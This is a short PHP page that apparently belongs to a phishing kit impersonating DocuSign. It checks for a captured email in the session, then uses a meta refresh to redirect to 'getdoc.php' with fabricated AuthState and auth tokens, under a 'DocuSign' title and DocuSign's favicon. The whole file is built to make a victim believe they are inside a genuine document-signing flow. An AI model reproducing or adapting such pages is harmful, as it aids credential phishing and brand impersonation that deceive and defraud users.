<?php
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
        
$email = @$_SESSION['email'];
$onclick = "getdoc.php";
$uricomp = "AuthState=_8b84cec567b1f281e967942a311e80e59edb25def1";
$sessvar = "567b1f28180e59ede967942a311eb25def1_8b84cec";
$randedlast = "567b1f28180e59ede967942a311eb25def1_8b84cec_8b84c";
$Redirect = "$onclick?$uricomp&auth=$sessvar&authed=1";



?>
<html>
<head>
  <meta content="IE=EDGE" http-equiv="X-UA-Compatible">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
  <META HTTP-EQUIV="Refresh" CONTENT="1;URL=<?php echo "$Redirect"; ?>">

  <title translate="DocuSign">Working...</title>

  <link type="image/x-icon" rel="icon" href="https://docucdn-a.akamaihd.net/olive/18.12.0/img/new_favicon.png">
</head>
<body>
</body>

</html>
